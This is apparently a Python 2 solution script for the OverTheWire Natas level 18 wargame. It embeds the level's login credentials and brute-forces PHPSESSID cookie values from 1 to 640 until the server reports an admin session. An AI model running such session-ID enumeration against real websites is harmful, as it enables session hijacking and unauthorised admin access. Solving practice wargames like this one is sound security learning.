#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

# response = session.get(url, auth = (username, password) )
# print response.text

for session_id in range(1, 641):
	response = session.get(url, cookies = {"PHPSESSID": str(session_id)}, auth = (username, password) )
	# response = session.post(url, data = {"username": "please", "password" : "subscribe"},  auth = (username, password) )
	content = response.text

	if ( "You are an admin" in content ):
		print "Got it!", session_id
		print content
		break
	else:
		print "trying", session_id
		# print content
		